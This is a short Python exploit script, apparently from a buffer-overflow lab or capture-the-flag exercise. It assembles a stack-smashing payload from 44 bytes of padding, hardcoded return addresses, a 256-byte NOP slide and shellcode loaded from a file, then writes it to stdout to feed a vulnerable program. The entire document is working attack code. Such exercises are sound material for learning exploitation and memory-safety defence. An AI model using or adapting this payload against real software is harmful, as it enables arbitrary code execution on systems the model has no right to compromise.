import sys

# Payload = junk + overwritten return address of vulnerable_function + return address back to main + nop slide + shell code
junk = b"A" * 44
nop_return_addr = b"\xff\xce\xff\xff"
main_return_addr = b"\x75\x0c\xda\xf7"
nop_slide = b"\x90" * 256

with open("encoded", "rb") as f:
    shell_code = f.read()

payload = junk + nop_return_addr + main_return_addr + nop_slide + shell_code

sys.stdout.buffer.write(payload)
